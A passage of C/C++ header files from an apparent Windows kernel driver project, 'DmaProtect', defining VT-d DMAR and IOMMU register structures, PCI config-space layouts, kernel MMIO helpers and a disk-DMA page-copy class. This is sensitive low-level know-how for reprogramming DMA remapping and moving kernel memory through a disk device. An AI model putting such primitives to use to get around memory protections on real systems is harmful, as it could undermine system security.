    EFI_ACPI_2_0_GENERIC_ADDRESS_STRUCTURE    ResetReg;
    UINT8                                     ResetValue;
    UINT8                                     Reserved2[3];
    UINT64                                    XFirmwareCtrl;
    UINT64                                    XDsdt;
    EFI_ACPI_2_0_GENERIC_ADDRESS_STRUCTURE    XPm1aEvtBlk;
    EFI_ACPI_2_0_GENERIC_ADDRESS_STRUCTURE    XPm1bEvtBlk;
    EFI_ACPI_2_0_GENERIC_ADDRESS_STRUCTURE    XPm1aCntBlk;
    EFI_ACPI_2_0_GENERIC_ADDRESS_STRUCTURE    XPm1bCntBlk;
    EFI_ACPI_2_0_GENERIC_ADDRESS_STRUCTURE    XPm2CntBlk;
    EFI_ACPI_2_0_GENERIC_ADDRESS_STRUCTURE    XPmTmrBlk;
    EFI_ACPI_2_0_GENERIC_ADDRESS_STRUCTURE    XGpe0Blk;
    EFI_ACPI_2_0_GENERIC_ADDRESS_STRUCTURE    XGpe1Blk;
} EFI_ACPI_2_0_FIXED_ACPI_DESCRIPTION_TABLE;

typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;

    /**
      This field indicates the maximum DMA physical addressability supported by
      this platform. The system address map reported by the BIOS indicates what
      portions of this addresses are populated. The Host Address Width (HAW) of
      the platform is computed as (N+1), where N is the value reported in this
      field.
      For example, for a platform supporting 40 bits of physical addressability,
      the value of 100111b is reported in this field.
    **/
    UINT8    HostAddressWidth;

    /**
      - Bit[0]:   INTR_REMAP - If Clear, the platform does not support interrupt
                  remapping. If Set, the platform supports interrupt remapping.
      - Bit[1]:   X2APIC_OPT_OUT - For firmware compatibility reasons, platform
                  firmware may Set this field to request system software to opt
                  out of enabling Extended xAPIC (X2APIC) mode. This field is
                  valid only when the INTR_REMAP field (bit 0) is Set.
      - Bit[2]:   DMA_CTRL_PLATFORM_OPT_IN_FLAG - Platform firmware is
                  recommended to Set this field to report any platform initiated
                  DMA is restricted to only reserved memory regions (reported in
                  RMRR structures) when transferring control to system software
                  such as on ExitBootServices().
      - Bits[7:3] Reserved.
    **/
    UINT8    Flags;
    UINT8    Reserved[10];
} EFI_ACPI_DMAR_HEADER;

//
// Translation Structure Formats
//
#define VTD_ROOT_ENTRY_NUMBER       256
#define VTD_CONTEXT_ENTRY_NUMBER    256
#define EFI_ACPI_4_0_DMA_REMAPPING_TABLE_SIGNATURE  SIGNATURE_32('D', 'M', 'A', 'R')

typedef union {
    struct {
        UINT64  Present : 1;
        UINT64  Reserved_1 : 11;
        UINT64  ContextTablePointerLo : 20;
        UINT64  ContextTablePointerHi : 32;

        UINT64  Reserved_64;
    } Bits;
    struct {
        UINT64  Uint64Lo;
        UINT64  Uint64Hi;
    } Uint128;
} VTD_ROOT_ENTRY;

typedef union {
    struct {
        UINT64  LowerPresent : 1;
        UINT64  Reserved_1 : 11;
        UINT64  LowerContextTablePointerLo : 20;
        UINT64  LowerContextTablePointerHi : 32;

        UINT64  UpperPresent : 1;
        UINT64  Reserved_65 : 11;
        UINT64  UpperContextTablePointerLo : 20;
        UINT64  UpperContextTablePointerHi : 32;
    } Bits;
    struct {
        UINT64  Uint64Lo;
        UINT64  Uint64Hi;
    } Uint128;
} VTD_EXT_ROOT_ENTRY;

typedef union {
    struct {
        UINT64  Present : 1;
        UINT64  FaultProcessingDisable : 1;
        UINT64  TranslationType : 2;
        UINT64  Reserved_4 : 8;
        UINT64  SecondLevelPageTranslationPointerLo : 20;
        UINT64  SecondLevelPageTranslationPointerHi : 32;

        UINT64  AddressWidth : 3;
        UINT64  Ignored_67 : 4;
        UINT64  Reserved_71 : 1;
        UINT64  DomainIdentifier : 16;
        UINT64  Reserved_88 : 8;
        UINT64  Reserved_96 : 32;
    } Bits;
    struct {
        UINT64  Uint64Lo;
        UINT64  Uint64Hi;
    } Uint128;
} VTD_CONTEXT_ENTRY;

typedef union {
    struct {
        UINT64  Present : 1;
        UINT64  FaultProcessingDisable : 1;
        UINT64  TranslationType : 3;
        UINT64  ExtendedMemoryType : 3;
        UINT64  DeferredInvalidateEnable : 1;
        UINT64  PageRequestEnable : 1;
        UINT64  NestedTranslationEnable : 1;
        UINT64  PASIDEnable : 1;
        UINT64  SecondLevelPageTranslationPointerLo : 20;
        UINT64  SecondLevelPageTranslationPointerHi : 32;

        UINT64  AddressWidth : 3;
        UINT64  PageGlobalEnable : 1;
        UINT64  NoExecuteEnable : 1;
        UINT64  WriteProtectEnable : 1;
        UINT64  CacheDisable : 1;
        UINT64  ExtendedMemoryTypeEnable : 1;
        UINT64  DomainIdentifier : 16;
        UINT64  SupervisorModeExecuteProtection : 1;
        UINT64  ExtendedAccessedFlagEnable : 1;
        UINT64  ExecuteRequestsEnable : 1;
        UINT64  SecondLevelExecuteEnable : 1;
        UINT64  Reserved_92 : 4;
        UINT64  PageAttributeTable0 : 3;
        UINT64  Reserved_Pat0 : 1;
        UINT64  PageAttributeTable1 : 3;
        UINT64  Reserved_Pat1 : 1;
        UINT64  PageAttributeTable2 : 3;
        UINT64  Reserved_Pat2 : 1;
        UINT64  PageAttributeTable3 : 3;
        UINT64  Reserved_Pat3 : 1;
        UINT64  PageAttributeTable4 : 3;
        UINT64  Reserved_Pat4 : 1;
        UINT64  PageAttributeTable5 : 3;
        UINT64  Reserved_Pat5 : 1;
        UINT64  PageAttributeTable6 : 3;
        UINT64  Reserved_Pat6 : 1;
        UINT64  PageAttributeTable7 : 3;
        UINT64  Reserved_Pat7 : 1;

        UINT64  PASIDTableSize : 4;
        UINT64  Reserved_132 : 8;
        UINT64  PASIDTablePointerLo : 20;
        UINT64  PASIDTablePointerHi : 32;

        UINT64  Reserved_192 : 12;
        UINT64  PASIDStateTablePointerLo : 20;
        UINT64  PASIDStateTablePointerHi : 32;
    } Bits;
    struct {
        UINT64  Uint64_1;
        UINT64  Uint64_2;
        UINT64  Uint64_3;
        UINT64  Uint64_4;
    } Uint256;
} VTD_EXT_CONTEXT_ENTRY;

typedef union {
    struct {
        UINT64  Present : 1;
        UINT64  Reserved_1 : 2;
        UINT64  PageLevelCacheDisable : 1;
        UINT64  PageLevelWriteThrough : 1;
        UINT64  Reserved_5 : 6;
        UINT64  SupervisorRequestsEnable : 1;
        UINT64  FirstLevelPageTranslationPointerLo : 20;
        UINT64  FirstLevelPageTranslationPointerHi : 32;
    } Bits;
    UINT64    Uint64;
} VTD_PASID_ENTRY;

typedef union {
    struct {
        UINT64  Reserved_0 : 32;
        UINT64  ActiveReferenceCount : 16;
        UINT64  Reserved_48 : 15;
        UINT64  DeferredInvalidate : 1;
    } Bits;
    UINT64    Uint64;
} VTD_PASID_STATE_ENTRY;

typedef union {
    struct {
        UINT64  Present : 1;
        UINT64  ReadWrite : 1;
        UINT64  UserSupervisor : 1;
        UINT64  PageLevelWriteThrough : 1;
        UINT64  PageLevelCacheDisable : 1;
        UINT64  Accessed : 1;
        UINT64  Dirty : 1;
        UINT64  PageSize : 1; // It is PageAttribute:1 for 4K page entry
        UINT64  Global : 1;
        UINT64  Ignored_9 : 1;
        UINT64  ExtendedAccessed : 1;
        UINT64  Ignored_11 : 1;
        // NOTE: There is PageAttribute:1 as bit12 for 1G page entry and 2M page entry
        UINT64  AddressLo : 20;
        UINT64  AddressHi : 20;
        UINT64  Ignored_52 : 11;
        UINT64  ExecuteDisable : 1;
    } Bits;
    UINT64    Uint64;
} VTD_FIRST_LEVEL_PAGING_ENTRY;

typedef union {
    struct {
        UINT64  Read : 1;
        UINT64  Write : 1;
        UINT64  Execute : 1;
        UINT64  ExtendedMemoryType : 3;
        UINT64  IgnorePAT : 1;
        UINT64  PageSize : 1;
        UINT64  Ignored_8 : 3;
        UINT64  Snoop : 1;
        UINT64  AddressLo : 20;
        UINT64  AddressHi : 20;
        UINT64  Ignored_52 : 10;
        UINT64  TransientMapping : 1;
        UINT64  Ignored_63 : 1;
    } Bits;
    UINT64    Uint64;
} VTD_SECOND_LEVEL_PAGING_ENTRY;

//
// Register Descriptions
//
#define R_VER_REG        0x00
#define R_CAP_REG        0x08
#define   B_CAP_REG_RWBF       BIT4
#define R_ECAP_REG       0x10
#define R_GCMD_REG       0x18
#define   B_GMCD_REG_QIE       BIT26
#define   B_GMCD_REG_WBF       BIT27
#define   B_GMCD_REG_SRTP      BIT30
#define   B_GMCD_REG_TE        BIT31
#define R_GSTS_REG       0x1C
#define   B_GSTS_REG_WBF       BIT27
#define   B_GSTS_REG_RTPS      BIT30
#define   B_GSTS_REG_TE        BIT31
#define R_RTADDR_REG     0x20
#define R_CCMD_REG       0x28
#define   B_CCMD_REG_CIRG_MASK    (BIT(62)|BIT(61))
#define   V_CCMD_REG_CIRG_GLOBAL  BIT(61)
#define   V_CCMD_REG_CIRG_DOMAIN  BIT(62)
#define   V_CCMD_REG_CIRG_DEVICE  (BIT(62)|BIT(61))
#define   B_CCMD_REG_ICC          BIT(63)
#define R_FSTS_REG       0x34
#define R_FECTL_REG      0x38
#define R_FEDATA_REG     0x3C
#define R_FEADDR_REG     0x40
#define R_FEUADDR_REG    0x44
#define R_AFLOG_REG      0x58

#define R_IVA_REG        0x00 // + IRO
#define   B_IVA_REG_AM_MASK       (BIT0|BIT1|BIT2|BIT3|BIT4|BIT5)
#define   B_IVA_REG_AM_4K         0 // 1 page
#define   B_IVA_REG_AM_2M         9 // 2M page
#define   B_IVA_REG_IH            BIT6
#define R_IOTLB_REG      0x08 // + IRO
#define   B_IOTLB_REG_IIRG_MASK   (BIT(61)|BIT(60))
#define   V_IOTLB_REG_IIRG_GLOBAL BIT(60)
#define   V_IOTLB_REG_IIRG_DOMAIN BIT(61)
#define   V_IOTLB_REG_IIRG_PAGE   (BIT(61)|BIT(60))
#define   B_IOTLB_REG_IVT         BIT(63)
#define   V_IOTLB_REG_DR          BIT(48)
#define   V_IOTLB_REG_DW          BIT(49)

#define R_FRCD_REG       0x00 // + FRO

#define R_PMEN_ENABLE_REG         0x64
#define R_PMEN_LOW_BASE_REG       0x68
#define R_PMEN_LOW_LIMITE_REG     0x6C
#define R_PMEN_HIGH_BASE_REG      0x70
#define R_PMEN_HIGH_LIMITE_REG    0x78

typedef union {
    struct {
        UINT8         ND : 3; // Number of domains supported
        UINT8         AFL : 1; // Advanced Fault Logging
        UINT8         RWBF : 1; // Required Write-Buffer Flushing
        UINT8         PLMR : 1; // Protected Low-Memory Region
        UINT8         PHMR : 1; // Protected High-Memory Region
        UINT8         CM : 1; // Caching Mode

        UINT8         SAGAW : 5; // Supported Adjusted Guest Address Widths
        UINT8         Rsvd_13 : 3;

        UINT8         MGAW : 6; // Maximum Guest Address Width
        UINT8         ZLR : 1; // Zero Length Read
        UINT8         Rsvd_23 : 1;

        UINT16        FRO : 10; // Fault-recording Register offset
        UINT16        SLLPS : 4; // Second Level Large Page Support
        UINT16        Rsvd_38 : 1;
        UINT16        PSI : 1; // Page Selective Invalidation

        UINT8         NFR : 8; // Number of Fault-recording Registers

        UINT8         MAMV : 6; // Maximum Address Mask Value
        UINT8         DWD : 1; // Write Draining
        UINT8         DRD : 1; // Read Draining

        UINT8         FL1GP : 1; // First Level 1-GByte Page Support
        UINT8         Rsvd_57 : 2;
        UINT8         PI : 1; // Posted Interrupts Support
        UINT8         Rsvd_60 : 4;
    } Bits;
    UINT64     Uint64;
} VTD_CAP_REG;

typedef union {
    struct {
        UINT8         C : 1; // Page-walk Coherency
        UINT8         QI : 1; // Queued Invalidation support
        UINT8         DT : 1; // Device-TLB support
        UINT8         IR : 1; // Interrupt Remapping support
        UINT8         EIM : 1; // Extended Interrupt Mode
        UINT8         Rsvd_5 : 1;
        UINT8         PT : 1; // Pass Through
        UINT8         SC : 1; // Snoop Control

        UINT16        IRO : 10; // IOTLB Register Offset
        UINT16        Rsvd_18 : 2;
        UINT16        MHMV : 4; // Maximum Handle Mask Value

        UINT8         ECS : 1; // Extended Context Support
        UINT8         MTS : 1; // Memory Type Support
        UINT8         NEST : 1; // Nested Translation Support
        UINT8         DIS : 1; // Deferred Invalidate Support
        UINT8         PASID : 1; // Process Address Space ID Support
        UINT8         PRS : 1; // Page Request Support
        UINT8         ERS : 1; // Execute Request Support
        UINT8         SRS : 1; // Supervisor Request Support

        UINT32        Rsvd_32 : 1;
        UINT32        NWFS : 1; // No Write Flag Support
        UINT32        EAFS : 1; // Extended Accessed Flag Support
        UINT32        PSS : 5; // PASID Size Supported
        UINT32        Rsvd_40 : 24;
    } Bits;
    UINT64     Uint64;
} VTD_ECAP_REG;

typedef union {
    struct {
        UINT32   Rsvd_0 : 12;
        UINT32   FILo : 20;      // FaultInfo
        UINT32   FIHi : 32;      // FaultInfo

        UINT32   SID : 16;       // Source Identifier
        UINT32   Rsvd_80 : 13;
        UINT32   PRIV : 1;       // Privilege Mode Requested
        UINT32   EXE : 1;        // Execute Permission Requested
        UINT32   PP : 1;         // PASID Present

        UINT32   FR : 8;         // Fault Reason
        UINT32   PV : 20;        // PASID Value
        UINT32   AT : 2;         // Address Type
        UINT32   T : 1;          // Type (0: Write, 1: Read)
        UINT32   F : 1;          // Fault
    } Bits;
    UINT64     Uint64[2];
} VTD_FRCD_REG;

typedef union {
    struct {
        UINT8    Function : 3;
        UINT8    Device : 5;
        UINT8    Bus;
    } Bits;
    struct {
        UINT8    ContextIndex;
        UINT8    RootIndex;
    } Index;
    UINT16     Uint16;
} VTD_SOURCE_ID;

typedef struct _DMAR_TRANSLATIONS
{
    //
    // The root table is only for each hardware unit and made up of 256 entries.
    //
    VTD_ROOT_ENTRY RootTable[256];

    //
    // The context table can be multiple but all root entries set up by this
    // project point to the same, single context table, hence this is not
    // ContextTable[256][256]. This table is made up of 256 entries.
    //
    VTD_CONTEXT_ENTRY ContextTable[256];

    //
    // The second-level PML4 can be multiple but all context entries set up by
    // this projects point to the same, single PML4, This table is made up of
    // 512 entries.
    //
    VTD_SECOND_LEVEL_PAGING_ENTRY SlPml4[512];

    //
    // This project only uses PML4[0], hence only one PDPT is used. PDPT is made
    // up of 512 entries.
    //
    VTD_SECOND_LEVEL_PAGING_ENTRY SlPdpt[1][512];

    //
    // Have PD for each PDPT and each PD is made up of 512 entries; hence [512][512].
    //
    VTD_SECOND_LEVEL_PAGING_ENTRY SlPd[1][512][512];
} DMAR_TRANSLATIONS;

typedef struct _DMAR_TRANSLATIONS_POINTERS
{
    //
    // The root table is only for each hardware unit and made up of 256 entries.
    //
    VTD_ROOT_ENTRY* RootTable;

    //
    // The context table can be multiple but all root entries set up by this
    // project point to the same, single context table, hence this is not
    // ContextTable[256][256]. This table is made up of 256 entries.
    //
    VTD_CONTEXT_ENTRY* ContextTable;

    //
    // The second-level PML4 can be multiple but all context entries set up by
    // this projects point to the same, single PML4, This table is made up of
    // 512 entries.
    //
    VTD_SECOND_LEVEL_PAGING_ENTRY* SlPml4;

    //
    // This project only uses PML4[0], hence only one PDPT is used. PDPT is made
    // up of 512 entries.
    //
    VTD_SECOND_LEVEL_PAGING_ENTRY* SlPdpt;

    //
    // Have PD for each PDPT and each PD is made up of 512 entries; hence [512][512].
    //
    VTD_SECOND_LEVEL_PAGING_ENTRY* SlPd;
} DMAR_TRANSLATIONS_POINTERS;

typedef struct _DMAR_UNIT_INFORMATION
{
    UINT64 RegisterBasePa;
    VTD_CAP_REG Capability;
    VTD_ECAP_REG ExtendedCapability;
    DMAR_TRANSLATIONS* Translations;
    BOOLEAN bEnabled;
} DMAR_UNIT_INFORMATION;

///
/// Definition for DMA Remapping Structure Header
///
typedef struct {
    UINT16    Type;
    UINT16    Length;
} EFI_ACPI_DMAR_STRUCTURE_HEADER;


///
/// Remapping Structure Types definitions from section 8.2
///@{
#define EFI_ACPI_DMAR_TYPE_DRHD  0x00
#define EFI_ACPI_DMAR_TYPE_RMRR  0x01
#define EFI_ACPI_DMAR_TYPE_ATSR  0x02
#define EFI_ACPI_DMAR_TYPE_RHSA  0x03
#define EFI_ACPI_DMAR_TYPE_ANDD  0x04
#define EFI_ACPI_DMAR_TYPE_SATC  0x05
#define EFI_ACPI_DMAR_TYPE_SIDP  0x06
///@}

typedef struct {
    EFI_ACPI_DMAR_STRUCTURE_HEADER    Header;

    /**
      - Bit[0]: INCLUDE_PCI_ALL
                - If Set, this remapping hardware unit has under its scope all
                  PCI compatible devices in the specified Segment, except devices
                  reported under the scope of other remapping hardware units for
                  the same Segment.
                - If Clear, this remapping hardware unit has under its scope only
                  devices in the specified Segment that are explicitly identified
                  through the DeviceScope field.
      - Bits[7:1] Reserved.
    **/
    UINT8     Flags;

    /**
      - Bits[3:0]: Indicates the size of the remapping hardware register set for
                   this remapping unit. If the value in this field is N, the size
                   of the register set is 2^N 4 KB pages
      - Bits[7:4]: Reserved.
    **/
    UINT8     Size;
    ///
    /// The PCI Segment associated with this unit.
    ///
    UINT16    SegmentNumber;
    ///
    /// Base address of remapping hardware register-set for this unit.
    ///
    UINT64    RegisterBaseAddress;
} EFI_ACPI_DMAR_DRHD_HEADER;

//
// 10.4.6 Root Table Address Register
//
typedef union _VTD_ROOT_TABLE_ADDRESS_REGISTER
{
    struct
    {
        UINT64 Reserved_1 : 10;             // [9:0]
        UINT64 TranslationTableMode : 2;    // [11:10]
        UINT64 RootTable : 52;              // [63:12]
    } Bits;
    UINT64 AsUInt64;
} VTD_ROOT_TABLE_ADDRESS_REGISTER;

///
/// Memory Mapped Configuration Space Access Table (MCFG)
/// This table is a basic description table header followed by
/// a number of base address allocation structures.
///
typedef struct {
    UINT64    BaseAddress;
    UINT16    PciSegmentGroupNumber;
    UINT8     StartBusNumber;
    UINT8     EndBusNumber;
    UINT32    Reserved;
} EFI_ACPI_MEMORY_MAPPED_ENHANCED_CONFIGURATION_SPACE_BASE_ADDRESS_ALLOCATION_STRUCTURE;

///
/// MCFG Table header definition.  The rest of the table
/// must be defined in a platform specific manner.
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT64                         Reserved;
} EFI_ACPI_MEMORY_MAPPED_CONFIGURATION_BASE_ADDRESS_TABLE_HEADER;

/** This typedef is used to shorten the name of the Enhanced
    Configuration Space address structure.
*/
typedef
EFI_ACPI_MEMORY_MAPPED_ENHANCED_CONFIGURATION_SPACE_BASE_ADDRESS_ALLOCATION_STRUCTURE
MCFG_CFG_SPACE_ADDR;

/*
* The number of entries in the table is given by (headers.Header.Length - sizeof(headers)) / sizeof(MCFG_CFG_SPACE_ADDR)
*/
typedef struct {
    EFI_ACPI_MEMORY_MAPPED_CONFIGURATION_BASE_ADDRESS_TABLE_HEADER headers;
    MCFG_CFG_SPACE_ADDR entry[1];
} MCFG_TABLE, * PMCFG_TABLE;

///
/// MCFG Revision (defined in spec)
///
#define EFI_ACPI_MEMORY_MAPPED_CONFIGURATION_SPACE_ACCESS_TABLE_REVISION  0x01

#define EFI_ACPI_4_0_MEMORY_MAPPED_ENHANCED_CONFIGURATION_SPACE_BASE_ADDRESS_ALLOCATION_SIGNATURE  SIGNATURE_32('M', 'C', 'F', 'G')

#pragma pack()

#define Add2Ptr(Ptr, Value)     ((VOID*)((UINT8*)(Ptr) + (Value)))
#define Int2Chars(Value) (Value), (Value >> 8), (Value >> 16), (Value >> 24)

typedef union _ADDRESS_TRANSLATION_HELPER
{
    //
    // Indexes to locate paging-structure entries corresponds to this virtual
    // address.
    //
    struct
    {
        UINT64 Unused : 12;         //< [11:0]
        UINT64 Pt : 9;              //< [20:12]
        UINT64 Pd : 9;              //< [29:21]
        UINT64 Pdpt : 9;            //< [38:30]
        UINT64 Pml4 : 9;            //< [47:39]
    } AsIndex;
    UINT64 AsUInt64;
} ADDRESS_TRANSLATION_HELPER;

typedef union {
    struct {
        USHORT function : 3;
        USHORT device : 5;
        USHORT bus : 8;
    } bits;

    USHORT Flags;
} ACPI_BDF, * PACPI_BDF;

typedef enum {
    PciDevice,
    PciP2pBridge,
    PciCardBusBridge,
    PciUndefined
} PCI_HEADER_TYPE;

#pragma pack(1)

///
/// Common header region in PCI Configuration Space
/// Section 6.1, PCI Local Bus Specification, 2.2
///
typedef struct {
    UINT16    VendorId;
    UINT16    DeviceId;
    UINT16    Command;
    UINT16    Status;
    UINT8     RevisionID;
    UINT8     ProgInterface;
    UINT8     Subclass;
    UINT8     Class;
    UINT8     CacheLineSize;
    UINT8     LatencyTimer;
    UINT8     HeaderType;
    UINT8     BIST;
} PCI_DEVICE_INDEPENDENT_REGION;

///
/// PCI Device header region in PCI Configuration Space
/// Section 6.1, PCI Local Bus Specification, 2.2
///
typedef struct {
    UINT32    Bar[6];
    UINT32    CISPtr;
    UINT16    SubsystemVendorID;
    UINT16    SubsystemID;
    UINT32    ExpansionRomBar;
    UINT8     CapabilityPtr;
    UINT8     Reserved1[3];
    UINT32    Reserved2;
    UINT8     InterruptLine;
    UINT8     InterruptPin;
    UINT8     MinGnt;
    UINT8     MaxLat;
} PCI_DEVICE_HEADER_TYPE_REGION;

///
/// PCI-PCI Bridge header region in PCI Configuration Space
/// Section 3.2, PCI-PCI Bridge Architecture, Version 1.2
///
typedef struct {
    UINT32    Bar[2];
    UINT8     PrimaryBus;
    UINT8     SecondaryBus;
    UINT8     SubordinateBus;
    UINT8     SecondaryLatencyTimer;
    UINT8     IoBase;
    UINT8     IoLimit;
    UINT16    SecondaryStatus;
    UINT16    MemoryBase;
    UINT16    MemoryLimit;
    UINT16    PrefetchableMemoryBase;
    UINT16    PrefetchableMemoryLimit;
    UINT32    PrefetchableBaseUpper32;
    UINT32    PrefetchableLimitUpper32;
    UINT16    IoBaseUpper16;
    UINT16    IoLimitUpper16;
    UINT8     CapabilityPtr;
    UINT8     Reserved[3];
    UINT32    ExpansionRomBAR;
    UINT8     InterruptLine;
    UINT8     InterruptPin;
    UINT16    BridgeControl;
} PCI_BRIDGE_CONTROL_REGISTER;

///
/// CardBus Controller Configuration Space,
/// Section 4.5.1, PC Card Standard. 8.0
///
typedef struct {
    UINT32    CardBusSocketReg;   ///< Cardbus Socket/ExCA Base
    UINT8     Cap_Ptr;
    UINT8     Reserved;
    UINT16    SecondaryStatus;      ///< Secondary Status
    UINT8     PciBusNumber;         ///< PCI Bus Number
    UINT8     CardBusBusNumber;     ///< CardBus Bus Number
    UINT8     SubordinateBusNumber; ///< Subordinate Bus Number
    UINT8     CardBusLatencyTimer;  ///< CardBus Latency Timer
    UINT32    MemoryBase0;          ///< Memory Base Register 0
    UINT32    MemoryLimit0;         ///< Memory Limit Register 0
    UINT32    MemoryBase1;
    UINT32    MemoryLimit1;
    UINT32    IoBase0;
    UINT32    IoLimit0;           ///< I/O Base Register 0
    UINT32    IoBase1;            ///< I/O Limit Register 0
    UINT32    IoLimit1;
    UINT8     InterruptLine;      ///< Interrupt Line
    UINT8     InterruptPin;       ///< Interrupt Pin
    UINT16    BridgeControl;      ///< Bridge Control
} PCI_CARDBUS_CONTROL_REGISTER;

typedef struct {
    UINT16    SubVendorId; // Subsystem Vendor ID
    UINT16    SubSystemId; // Subsystem ID
    UINT32    LegacyBase;  // Optional 16-Bit PC Card Legacy
    // Mode Base Address
    //
    UINT32    Data[46];
} PCI_CARDBUS_DATA;

typedef union {
    PCI_DEVICE_HEADER_TYPE_REGION    Device;
    PCI_BRIDGE_CONTROL_REGISTER      Bridge;
    PCI_CARDBUS_CONTROL_REGISTER     CardBus;
} NON_COMMON_UNION;

typedef struct alignas(PAGE_SIZE) {
    PCI_DEVICE_INDEPENDENT_REGION    Common;
    NON_COMMON_UNION                 NonCommon;
    UINT32                           Data[48];
} PCI_CONFIG_SPACE, * PPCI_CONFIG_SPACE;

#define MAX_PCIE_IN_CONFIG_SPACE 0x200
#define SYSTEM_BASE_PERIPHERAL_CLASS 0x8
#define IOMMU_SUBCLASS 0x6

#pragma pack()

namespace acpi {
    class DmarRegister {
        DWORD64 _registerPa;
        volatile PVOID _mappedRegister;

    public:
        DmarRegister(DWORD64 registerPa);
        ~DmarRegister();

        void SendGlobalCmdSerialized(DWORD64 mask, BOOLEAN bSet);
        void SendContextCmdSerialized(DWORD64 mask);
        void SetRootTable(PVOID pTable);
        PVOID GetRootTable();
        PVOID GetMappedRegister();
        void InvalidateIoTlb(DWORD64 mask);
    };

    class McfgRegister {
        MCFG_TABLE* _mcfgTable;
        DWORD64 _entries;
    public:
        McfgRegister(MCFG_TABLE* table);

        PPCI_CONFIG_SPACE GetPCIeConfigSpace(ACPI_BDF bdf);
        PPCI_CONFIG_SPACE AllPCIeConfigSpace(int index);

        int size();
        MCFG_CFG_SPACE_ADDR& operator [](int index);
    };

    extern EFI_ACPI_DMAR_HEADER* dmarTable;
    extern MCFG_TABLE* mcfgTable;

    bool Init();
}
```

`DmaProtect/include/cpp.h`:

```h
#pragma once
#include <ntddk.h>

namespace cpp {
	void* kMalloc(size_t sz);
	void kFree(void* pBuffer);
}
```

`DmaProtect/include/cpu.h`:

```h
#pragma once
#include "macros.h"
#include "Arch/Cpuid.h"

#include <ntddk.h>
#include <intrin.h>

namespace CPU {
	extern bool bIntelCPU;

	bool IsIntelCPU();
	void Init();
	VOID* WriteBackDataCacheRange(VOID* Address, SIZE_T Length);

    template<typename T>
    T MmIoRead(DWORD64 pMmio) {
        PHYSICAL_ADDRESS pa = { 0 };
        pa.QuadPart = pMmio;
        PVOID pRegister = MmMapIoSpace(pa, sizeof(T), MEMORY_CACHING_TYPE::MmNonCached);

        T ret = *(T*)pRegister;

        MmUnmapIoSpace(pRegister, sizeof(T));

        return ret;
    }

    template<typename T>
    void MmIoWrite(DWORD64 pMmio, T value) {
        PHYSICAL_ADDRESS pa = { 0 };
        pa.QuadPart = pMmio;
        PVOID pRegister = MmMapIoSpace(pa, sizeof(T), MEMORY_CACHING_TYPE::MmNonCached);

        *(T*)pRegister = value;

        MmUnmapIoSpace(pRegister, sizeof(T));
    }
}
```

`DmaProtect/include/ddma.h`:

```h
#pragma once

#include "cpp.h"

#ifdef _KERNEL_MODE

typedef struct _DISK {
    PDEVICE_OBJECT Device;
    // Buffer holding sectors original data
    UINT8 Buffer[PAGE_SIZE];
} DISK, * PDISK;

class DdmaProvider {
private:
    PDISK pDisk;
    BOOLEAN bScsi;

public:
    DdmaProvider();
    ~DdmaProvider();

    NTSTATUS ReadPage(OUT PVOID dest);

    NTSTATUS WritePage(IN PVOID src);

    NTSTATUS DiskCopyPage(PVOID dest, PVOID src);
};

#endif
```

`DmaProtect/include/iommu.h`:

```h
#pragma once

#include "Memory.h"
#include "signatures.h"
#include "acpi.h"

#pragma pack(1)

/*
* IOMMU capability definition structures
*/

typedef struct {
    DWORD32 CapId : 8;
    DWORD32 CapPtr : 8;
    DWORD32 CapType : 3;
    DWORD32 CapRev : 5;
    DWORD32 IotlbSup : 1;
    DWORD32 HtTunnel : 1;
    DWORD32 NpCache : 1;
    DWORD32 EFRSup : 1;
    DWORD32 CapExt : 1;
    DWORD32 Reserved : 3;
} IOMMU_CAPABILITY_HEADER, * PIOMMU_CAPABILITY_HEADER;

typedef struct {
    DWORD32 Enable : 1;
    DWORD32 Reserved : 13;
    DWORD32 BaseAddress_18_14 : 5;
    DWORD32 BaseAddress_31_19 : 13;
} IOMMU_BASE_ADDRESS_LOW_REGISTER, * PIOMMU_BASE_ADDRESS_LOW_REGISTER;

typedef DWORD32 IOMMU_BASE_ADDRESS_HIGH_REGISTER, * PIOMMU_BASE_ADDRESS_HIGH_REGISTER;

typedef struct {
    DWORD32 UnitID : 5;
    DWORD32 Reserved : 2;
    DWORD32 RngValid : 1;
    DWORD32 BusNumber : 8;
    DWORD32 FirstDevice : 8;
    DWORD32 LastDevice : 8;
} IOMMU_RANGE_REGISTER, * PIOMMU_RANGE_REGISTER;

typedef struct {
    DWORD32 MsiNum : 5;
    DWORD32 GVAsize : 3;
    DWORD32 PAsize : 7;
    DWORD32 VAsize : 7;
    DWORD32 HtAtsResv : 1;
    DWORD32 Reserved : 4;
    DWORD32 MsiNumPPR : 5;
} IOMMU_MISCELLANEOUS_INFO_REGISTER, * PIOMMU_MISCELLANEOUS_INFO_REGISTER;

typedef struct {
    DWORD32 MsiNumGA : 5;
    DWORD32 Reserved : 27;
} IOMMU_MISCELLANEOUS_INFO_REGISTER_1, * PIOMMU_MISCELLANEOUS_INFO_REGISTER_1;

typedef struct {
    IOMMU_CAPABILITY_HEADER header;
    IOMMU_BASE_ADDRESS_LOW_REGISTER baseAddressLow;
    IOMMU_BASE_ADDRESS_HIGH_REGISTER baseAddressHigh;
    IOMMU_RANGE_REGISTER rangeReg;
    IOMMU_MISCELLANEOUS_INFO_REGISTER miscInfoReg;
    IOMMU_MISCELLANEOUS_INFO_REGISTER_1 miscInfoReg1;
} IOMMU_CAP_BLOCK_REGISTER, * PIOMMU_CAP_BLOCK_REGISTER;

/*
* IOMMU vendor specific structures
*/
typedef struct {
    DWORD32 CapID : 8;
    DWORD32 CapPtr : 8;
    DWORD32 CapLen : 8;
    DWORD32 CapType : 8;
} IOMMU_VENDOR_SPECIFIC_CAP_HEADER, * PIOMMU_VENDOR_SPECIFIC_CAP_HEADER;

typedef struct {
    DWORD32 VSC_ID : 16;
    DWORD32 VSC_Rev : 8;
    DWORD32 Reserved : 8;
} IOMMU_VENDOR_SPECIFIC_CAP_INFO, * PIOMMU_VENDOR_SPECIFIC_CAP_INFO;

typedef struct {
    DWORD32 VF_Enable : 1;
    DWORD32 Reserved : 27;
    DWORD32 VF_BaseAddress : 4;
} IOMMU_VENDOR_SPECIFIC_VF_BASE_LOW, * PIOMMU_VENDOR_SPECIFIC_VF_BASE_LOW;

typedef DWORD32 IOMMU_VENDOR_SPECIFIC_VF_BASE_HIGH, * PIOMMU_VENDOR_SPECIFIC_VF_BASE_HIGH;

typedef struct {
    DWORD32 VF_Enable : 1;
    DWORD32 Reserved : 21;
    DWORD32 VF_BaseAddress : 10;
